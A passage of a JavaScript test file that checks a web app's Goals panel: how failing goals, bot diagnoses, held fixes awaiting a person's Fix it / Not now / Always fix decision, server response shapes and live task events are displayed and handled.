    if (had) Object.defineProperty(window, 'matchMedia', had);
    else delete window.matchMedia;
  }
});

test('the board shows Goals on All work only, and there is no setting', () => {
  const board = readFileSync(new URL('../src/components/MissionBoardView.tsx', import.meta.url), 'utf8');
  assert.match(board, /<GoalsStrip[^>]*hidden=\{!!missionId\}/s, 'hidden (drawer only) inside a mission');
  const settings = readFileSync(new URL('../src/components/SettingsModal.tsx', import.meta.url), 'utf8');
  // The "Learn from earlier work" hint names goals as one thing bots learn from; that is not a Goals switch.
  assert.doesNotMatch(settings.replace(/goals that stopped holding/g, ''), /goals/i, 'Settings has no Goals switch');
  assert.equal(typeof b.parseGoalsSetting, 'undefined');
  assert.equal(typeof b.GOALS_SETTING_EVENT, 'undefined');
});

// ---------------------------------------------------------------------------
// Plan v2 quiet deltas D1-D9 (smart-results-goals/goals-ui-quiet-deltas.md; Rigel's G-U-16..24, G-Q-27, G-Q-28).

const failedCheck = () => check({ latest: { status: 'failed', verdict: 'not_met', excerpt: 'HTTP 502', observed_at: minsAgo(10) } });
/** A failing goal with an open remediation: `held` is the Fix's run task, `report` the diagnosis, `opened` how long ago. */
const incident = ({ held = 't_run', report = true, opened = 20, id = 'g1', mode = 'suggest', ...over } = {}) =>
  goal({
    id, status: 'not_met', mode, checks: [failedCheck()],
    open_mission: { id: 'm1', title: 'Restore: The site stays up', status: 'active', attempt: 1, opened_at: minsAgo(opened), run_task_id: held, ...(report ? { cause: 'The disk is full.', proposed_fix: 'Delete old logs.' } : {}) },
    ...over,
  });
const incidentApi = (list, over = {}) => ({
  ...fakeApi(list),
  notNow: async (id, key) => (incidentApi.calls.push(['notNow', id, key]), goal({ id, status: 'needs_you', status_reason: 'declined', mode: 'suggest', checks: [failedCheck()], open_mission: list[0].open_mission })),
  alwaysFix: async (id, key) => (incidentApi.calls.push(['alwaysFix', id, key]), goal({ id, status: 'not_met', mode: 'fix', checks: [failedCheck()], open_mission: null })),
  runFix: async (task, key) => (incidentApi.calls.push(['runFix', task, key]), true),
  ...over,
});
incidentApi.calls = [];
const used = () => (localStorage.removeItem('kwnt.goals.notnow'), incidentApi.calls.splice(0));

test('D5: no Fix it, Not now or Always fix before there is a diagnosis; they come with the report, or after a failed look', async () => {
  const looking = incident({ report: false, opened: 5 });
  const row = b.rowHtml({ goal: looking, names, now: NOW, onAction() {}, decision: b.goalDecision(looking, [], NOW, null) });
  assert.match(text(row), /Cody is looking into it/);
  assert.doesNotMatch(row, /data-goal-fix|data-goal-not-now|data-goal-always/, 'no buttons while it looks');
  assert.equal(b.displayStatus(looking, [], NOW), 'not_met', 'Failing while the bot looks: nobody is asked yet');

  const ready = incident();
  assert.equal(b.diagnosisPhase(ready, [], NOW), 'ready');
  assert.equal(b.displayStatus(ready, [], NOW), 'needs_you');
  const full = b.detailHtml({ detail: b.parseGoalDetail({ goal: ready, checks: ready.checks, events: [], fix_tasks: [], missions: [] }), names, now: NOW });
  assert.match(text(full), /Likely cause: The disk is full\. Proposed fix: Delete old logs\./);
  for (const a of ['data-goal-fix', 'data-goal-not-now', 'data-goal-always']) assert.match(full, new RegExp(a), a);
  assert.match(text(full), /Fix it Not now Always fix this goal/);

  // Thirty minutes with no report: it couldn't finish; the person still gets the choice.
  const stuck = incident({ report: false, opened: 31 });
  assert.equal(b.diagnosisPhase(stuck, [], NOW), 'failed');
  const t = text(b.detailHtml({ detail: b.parseGoalDetail({ goal: stuck, checks: stuck.checks, events: [], fix_tasks: [], missions: [] }), names, now: NOW }));
  assert.match(t, /Cody couldn’t finish looking into it\. The fix waits for you\./);
  assert.match(t, /Fix it Not now/);
  // An investigated event is a report too (D4), and one that says failed is a failed look.
  const ev = (detail) => [{ id: 'e1', kind: 'investigated', actor: 'kwant', detail, created_at: minsAgo(3) }];
  assert.equal(b.diagnosisPhase(looking, ev({ cause: 'Disk full' }), NOW), 'ready');
  assert.equal(b.diagnosisPhase(looking, ev({ failed: true }), NOW), 'failed');
});

test('D1/D3: Not now calls the route once, silently; the goal then reads Failing, never Needs you, and keeps a quiet Fix it', async () => {
  used();
  const g1 = incident();
  const api = incidentApi([g1]);
  const m = await mount(b.GoalsStrip, { names, now: NOW, api, initial: { goals: [g1] } });
  assert.equal(m.q('[data-goal="g1"]').dataset.status, 'needs_you');
  await m.click('[data-goal-not-now]');
  await settle();
  const calls = used();
  assert.deepEqual(calls.map((c) => [c[0], c[1]]), [['notNow', 'g1']], 'one call, nothing else');
  assert.ok(calls[0][2], 'sends an Idempotency-Key');
  // `declined` reads Failing, and nobody is asked again: no amber, no needs-you count (G-Q-27/28).
  assert.equal(m.q('[data-goal="g1"]').dataset.status, 'not_met');
  assert.doesNotMatch(m.q('[data-goal-counts]').textContent, /need/);
  assert.ok(!m.q('[data-goal-not-now]') && !m.q('[data-goal-always]'), 'no more asking');
  assert.match(m.q('[data-goal-line="declined"]').textContent, /You chose Not now/);
  assert.ok(m.q('[data-goal-fix-quiet]'), 'a quiet Fix it stays');
  assert.ok(!m.q('[data-goals-notice]'), 'silent: no notice, no toast');
  assert.ok(!m.q('[role="alert"]'));
  m.done();
  // The text reads the same from another device: the server's `declined`.
  const server = goal({ id: 'g1', status: 'needs_you', status_reason: 'declined', checks: [failedCheck()], open_mission: incident().open_mission });
  assert.equal(b.displayStatus(server, [], NOW), 'not_met');
  assert.equal(b.goalDecision(server, [], NOW).kind, 'declined');
  assert.equal(b.declinedText(minsAgo(0), NOW), 'You chose Not now at ' + new Date(NOW).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }) + '. The fix waits; it’s dropped if this recovers.');
  assert.match(b.declinedText(null, NOW), /^Not now\./);
});

test('D1: on a server without the route, Not now only hides it here; any other error undoes the hide and says so', async () => {
  used();
  const g1 = incident();
  for (const status of [404, 405, 0]) {
    used();
    const api = incidentApi([g1], { notNow: async () => { throw new b.GoalError('nope', status); } });
    const m = await mount(b.GoalsStrip, { names, now: NOW, api, initial: { goals: [g1] } });
    await m.click('[data-goal-not-now]');
    await settle();
    assert.ok(m.q('[data-goal-line="declined"]'), `${status}: hidden locally`);
    assert.ok(!m.q('[data-goal-not-now]'));
    assert.ok(!m.q('[data-goal="g1"] [data-goal-error]'), `${status}: no error shown`);
    m.done();
  }
  used();
  const api = incidentApi([g1], { notNow: async () => { throw new b.GoalError('Only you can change goals.', 403); } });
  const m = await mount(b.GoalsStrip, { names, now: NOW, api, initial: { goals: [g1] } });
  await m.click('[data-goal-not-now]');
  await settle();
  assert.ok(m.q('[data-goal-not-now]'), 'the decision is back');
  assert.equal(m.q('[data-goal="g1"] [data-goal-error]').textContent, 'Only you can change goals.');
  m.done();
});

test('D2: Always fix this goal calls the route, then runs the held fix; on a server without it, it sets fix mode instead', async () => {
  used();
  const g1 = incident();
  const api = incidentApi([g1], { get: async (id) => b.parseGoalDetail({ goal: g1, checks: g1.checks, events: [], fix_tasks: [], missions: [] }) });
  const m = await mount(b.GoalsStrip, { names, now: NOW, api, initial: { goals: [g1] } });
  await m.click('[data-goal-always]');
  await settle();
  assert.deepEqual(used().map((c) => [c[0], c[1]]), [['alwaysFix', 'g1'], ['runFix', 't_run']], 'the route, then the held fix runs');
  assert.match(m.q('[data-goals-notice]').textContent, /./);
  m.done();

  const old = incidentApi([g1], {
    alwaysFix: async () => { throw new b.GoalError('missing', 404); },
    update: async (id, patch) => (incidentApi.calls.push(['update', id, patch]), goal({ id, mode: 'fix', status: 'not_met', checks: [failedCheck()], open_mission: null })),
  });
  const m2 = await mount(b.GoalsStrip, { names, now: NOW, api: old, initial: { goals: [g1] } });
  await m2.click('[data-goal-always]');
  await settle();
  const c = used();
  assert.deepEqual(c.map((x) => x[0]), ['update', 'runFix']);
  assert.deepEqual(c[0].slice(1), ['g1', { mode: 'fix' }]);
  m2.done();

  // Fix it alone runs the held task and does not change the mode.
  const api3 = incidentApi([g1]);
  const m3 = await mount(b.GoalsStrip, { names, now: NOW, api: api3, initial: { goals: [g1] } });
  await m3.click('[data-goal-fix]');
  await settle();
  assert.deepEqual(used().map((x) => [x[0], x[1]]), [['runFix', 't_run']]);
  m3.done();
});

test('D6: the pill says Failing, Needs you or Fixing only when that is true', () => {
  const st = (g, ev = []) => b.displayStatus(g, ev, NOW);
  assert.equal(st(incident({ report: false, opened: 2 })), 'not_met', 'looking: Failing');
  assert.equal(st(incident()), 'needs_you', 'report ready, Fix held: Needs you');
  assert.equal(st(incident({ held: null, mode: 'fix' }), []), 'not_met', 'fix mode, nothing running yet reads the server word');
  // The Fix was released (no held task, a report in): it runs, so Fixing.
  const running = goal({ status: 'fixing', mode: 'suggest', checks: [failedCheck()], open_mission: { id: 'm1', title: 'Restore', status: 'active', attempt: 1, opened_at: minsAgo(20), run_task_id: null, cause: 'x' } });
  assert.equal(st(running), 'fixing');
  // Fixing while the Fix is still held is not true: it's a decision.
  const held = goal({ status: 'fixing', mode: 'suggest', checks: [failedCheck()], open_mission: { id: 'm1', title: 'Restore', status: 'active', attempt: 1, opened_at: minsAgo(20), run_task_id: 't_run', cause: 'x' } });
  assert.equal(st(held), 'needs_you');
  assert.equal(st(goal()), 'met');
  assert.equal(b.goalStatusLook('met').label, 'OK');
  assert.equal(b.goalStatusLook('not_met').label, 'Failing');
  assert.equal(b.goalStatusLook('needs_you').label, 'Needs you');
  assert.equal(b.goalStatusLook('fixing').label, 'Fixing');
});

test('D7: a waiting goal says what it waits for from status_reason, without a read of its own', () => {
  const w = goal({ status: 'waiting', status_reason: 'Restore: kwant.si is up' });
  assert.equal(w.waiting_for, 'Restore: kwant.si is up');
  assert.equal(goal({ status: 'waiting', waiting_for: 'g2', status_reason: 'x' }).waiting_for, 'g2', 'an explicit waiting_for wins');
  assert.equal(goal({ status: 'met', status_reason: 'x' }).waiting_for, null, 'only a waiting goal reads it');
  assert.match(text(b.rowHtml({ goal: w, names, now: NOW })), /Waiting/);
});

test('D8: the list is enough; a goal that wants a look and carries no mission info gets at most three detail reads', async () => {
  const bare = (id) => b.parseGoal({ id, space_id: 's1', title: `T${id}`, kwant_id: 'k_cody', status: 'not_met', mode: 'suggest', interval_minutes: 60, created_at: minsAgo(60), updated_at: minsAgo(5), checks: [failedCheck()] });
  assert.equal(bare('a').has_mission_info, false);
  assert.equal(goal().has_mission_info, true, 'a list row with open_mission (even null) needs no read');
  const list = ['a', 'b', 'c', 'd', 'e'].map(bare);
  const api = fakeApi([], { list: async () => (api.calls.push(['list']), list), get: async (id) => (api.calls.push(['get', id]), b.parseGoalDetail({ goal: { ...list.find((x) => x.id === id), open_mission: incident().open_mission }, checks: [failedCheck()], events: [], fix_tasks: [], missions: [] })) });
  const m = await mount(b.GoalsStrip, { names, now: NOW, api });
  await settle(50);
  assert.ok(api.calls.filter((c) => c[0] === 'get').length <= 3, 'at most three reads per list load');
  m.done();
  const met = fakeApi([goal()]);
  const m2 = await mount(b.GoalsStrip, { names, now: NOW, api: met, initial: { goals: [goal()] } });
  await settle(20);
  assert.equal(met.calls.filter((c) => c[0] === 'get').length, 0, 'OK goals are never read');
  m2.done();
});

test('D9: Keep this true shows once per task; a repeat says Already kept true, and a goal’s own fix task has no button', async () => {
  const passing = { id: 'ck1', kind: 'command', command: 'npm test', status: 'passed', required: true, label: 'Tests', spec: { command: 'npm test' } };
  const task = { id: 't1', title: 'Add tests', state: 'verified', owner_kwant_id: 'k_cody' };
  const fresh = (over) => goal({ id: 'gk', title: 'Add tests', status: 'checking', created_at: new Date().toISOString(), ...over });
  const run = async (made) => {
    const calls = [];
    const m = await mount(b.KeepTrueBox, { task, checks: [passing], names, api: { fromTask: async (id) => (calls.push(id), made), approve: async (id) => (calls.push(['approve', id]), made) }, onOpenGoal() {} });
    await m.click('[data-keep-true]');
    await m.click('[data-keep-true-yes]');
    await settle();
    const t = m.q('[data-keep-true-done]').textContent.trim();
    m.done();
    return { t, calls };
  };
  const first = await run(fresh());
  assert.match(first.t, /^Goal added: “Add tests”\. It’s checked every 1 hour\./);
  assert.deepEqual(first.calls, ['t1']);
  const again = await run(fresh({ created_at: minsAgo(30) }));
  assert.match(again.t, /^Already kept true: “Add tests”\./);
  assert.doesNotMatch(again.t, /Goal added/);

  const board = readFileSync(new URL('../src/components/MissionBoardView.tsx', import.meta.url), 'utf8');
  assert.match(board, /!inGoalMission && <KeepTrueBox/, 'no Keep this true on a task inside a goal’s remediation mission');
  assert.match(board, /inGoalMission=\{!!missionGoalLink\(/);
});

// The real server's shapes (Rigel, #229 on #234 + #231): a goal in suggest mode whose Investigate finished comes back
// as status needs_you / status_reason fix_ready, with open_mission.run_task_id set and `diagnosis` a plain string;
// its events carry integer ids.
const fixReady = (over = {}) =>
  goal({
    id: 'g1', status: 'needs_you', status_reason: 'fix_ready', mode: 'suggest', checks: [failedCheck()],
    diagnosis: 'The disk is full. Delete old logs.',
    open_mission: { id: 'm1', title: 'Restore: The site stays up', status: 'active', attempt: 1, opened_at: minsAgo(20), run_task_id: 't_run' },
    ...over,
  });

test('server shape: needs_you / fix_ready with a held task is the Fix it decision, not a dead end', () => {
  const g1 = fixReady();
  const d = b.goalDecision(g1, [], NOW, null);
  assert.equal(d.kind, 'run');
  assert.equal(d.taskId, 't_run');
  assert.equal(d.phase, 'ready');
  assert.equal(b.displayStatus(g1, [], NOW), 'needs_you', 'still drawn as Needs you');
  assert.match(b.stripSummary([g1], NOW), /1 needs you/);
  const row = b.rowHtml({ goal: g1, names, now: NOW, onAction() {}, decision: d });
  for (const a of ['data-goal-fix', 'data-goal-not-now', 'data-goal-always']) assert.match(row, new RegExp(a), `row ${a}`);
  const full = b.detailHtml({ detail: b.parseGoalDetail({ goal: g1, checks: g1.checks, events: [], fix_tasks: [], missions: [] }), names, now: NOW });
  for (const a of ['data-goal-fix', 'data-goal-not-now', 'data-goal-always']) assert.match(full, new RegExp(a), `drawer ${a}`);
  assert.match(text(full), /The disk is full\. Delete old logs\./);
  assert.doesNotMatch(text(full), /Nothing runs on its own until you act/);
  // Not now on this device: declined, not a request. A failed look is still named.
  assert.equal(b.goalDecision(g1, [], NOW, 't_run').kind, 'declined');
  const failed = [{ id: '7', kind: 'investigated', actor: 'kwant', detail: { failed: true }, created_at: minsAgo(3) }];
  assert.equal(b.goalDecision(g1, failed, NOW, null).phase, 'failed');
  // No held task: nothing to release, so it stays a plain Needs you with the reason in words.
  const none = fixReady({ open_mission: null });
  assert.equal(b.goalDecision(none, [], NOW, null).kind, 'needs_you');
  assert.match(b.needsYouText('fix_ready'), /^Needs you: a fix is ready/);
  // The other Needs you reasons are unchanged.
  assert.equal(b.goalDecision(fixReady({ status_reason: 'budget_spent' }), [], NOW, null).kind, 'needs_you');
});

test('server shape: goal events with integer ids are read', () => {
  const ev = (id, kind, detail) => ({ id, kind, actor: 'kwant', detail, created_at: minsAgo(30 - id) });
  const g1 = fixReady();
  const detail = b.parseGoalDetail({
    goal: g1, checks: g1.checks, fix_tasks: [], missions: [],
    events: [ev(6, 'investigated', { failed: true }), ev(5, 'not_met', {}), { id: 4.5, kind: 'checked', actor: 'kwant', detail: '{"x":1}', created_at: minsAgo(40) }, { id: null, kind: 'bad' }],
  });
  assert.deepEqual(detail.events.map((e) => e.id), ['4.5', '5', '6'], 'integer ids kept as strings; ones with no id still dropped');
  assert.equal(b.diagnosisPhase(g1, detail.events, NOW), 'failed', 'investigated.detail.failed sees the event');
  const html = text(b.detailHtml({ detail, names, now: NOW }));
  assert.doesNotMatch(html, /Nothing has happened yet/);
});

// F3 (Rigel): after Fix it the server flips the goal to `fixing` about 25 s later when the task is claimed, and says so
// only through task_updated / mission_updated, never goal_updated.
test('live: a goal’s fix being claimed (task_updated / mission_updated, no goal_updated) reloads the strip', async () => {
  const held = fixReady();
  const released = fixReady({ open_mission: { id: 'm1', title: 'Restore: The site stays up', status: 'active', attempt: 1, opened_at: minsAgo(20), run_task_id: null } });
  const fixing = goal({ id: 'g1', status: 'fixing', mode: 'suggest', checks: [failedCheck()], diagnosis: 'The disk is full. Delete old logs.', open_mission: released.open_mission });
  let list = [held];
  const api = incidentApi([held], { list: async () => (incidentApi.calls.push(['list']), list.map((x) => ({ ...x }))) });
  used();
  const m = await mount(b.GoalsStrip, { names, now: NOW, api });
  const reads = () => incidentApi.calls.filter((c) => c[0] === 'list').length;
  assert.equal(m.q('[data-goal="g1"]').dataset.status, 'needs_you');
  assert.ok(m.q('[data-goal-fix]'), 'Fix it is offered');

  // Fix it: the held task is released, but the server still says needs_you / fix_ready until the claim.
  list = [released];
  await m.click('[data-goal-fix]');
  await settle(300);
  assert.deepEqual(incidentApi.calls.filter((c) => c[0] === 'runFix').map((c) => c[1]), ['t_run']);
  assert.equal(m.q('[data-goal="g1"]').dataset.status, 'fixing', 'released and unclaimed reads Fixing, not a dead-end Needs you');
  assert.doesNotMatch(m.text(), /Nothing runs on its own until you act/);
  assert.ok(!m.q('[data-goal-fix]'), 'no second Fix it');

  // An unrelated task does not reload anything.
  const before = reads();
  b.emitMission({ type: 'task_updated', data: { task: { id: 'other', mission_id: 'm_other' } } });
  await settle(300);
  assert.equal(reads(), before, 'a task of no goal is ignored');

  // The claim: the server now says fixing, and announces only the task. One read for a burst.
  list = [fixing];
  b.emitMission({ type: 'task_updated', data: { task: { id: 't_run', mission_id: 'm1', state: 'running' } } });
  b.emitMission({ type: 'task_updated', data: { task: { id: 't_run', mission_id: 'm1', state: 'running' } } });
  b.emitMission({ type: 'mission_updated', data: { mission: { id: 'm1', goal_link: { id: 'g1', title: 'The site stays up' } } } });
  await settle(300);
  assert.equal(reads(), before + 1, 'a burst of task and mission events is one read');
  assert.equal(m.q('[data-goal="g1"]').dataset.status, 'fixing');
  m.done();

  // A goal whose fix was never touched here still reloads on its own mission's task (another tab pressed Fix it).
  list = [held];
  const m2 = await mount(b.GoalsStrip, { names, now: NOW, api });
  const r2 = reads();
  list = [fixing];
  b.emitMission({ type: 'task_updated', data: { task: { id: 't_run', mission_id: 'm1' } } });
  await settle(300);
  assert.equal(reads(), r2 + 1);
  assert.equal(m2.q('[data-goal="g1"]').dataset.status, 'fixing');
  m2.done();
  assert.equal(b.liveTouchesGoalFix([held], { taskId: 'x', missionId: 'y' }), false);
  assert.equal(b.liveTouchesGoalFix([held], { missionId: 'zzz', goalId: 'g1' }), true);
});

test('Fix it refused with not_held (another tab pressed Run) reloads the goal and says it is already being fixed', async () => {
  const held = fixReady();
  const fixing = goal({ id: 'g1', status: 'fixing', mode: 'suggest', checks: [failedCheck()], diagnosis: 'The disk is full. Delete old logs.', open_mission: { ...held.open_mission, run_task_id: null } });
  let list = [held];
  const api = incidentApi([held], {
    list: async () => (incidentApi.calls.push(['list']), list.map((x) => ({ ...x }))),
    runFix: async () => { throw new b.MissionError('The task isn’t on hold.', 409, 'not_held'); },
  });
  used();
  const m = await mount(b.GoalsStrip, { names, now: NOW, api });
  list = [fixing];
  await m.click('[data-goal-fix]');
  await settle(50);
  assert.match(m.text(), /already being fixed/);
  assert.doesNotMatch(m.text(), /isn’t on hold/);
  assert.equal(m.q('[data-goal="g1"]').dataset.status, 'fixing', 'the goal was read again');
  assert.ok(!m.q('[data-goal-fix]'), 'the stale buttons are gone');
  m.done();
});
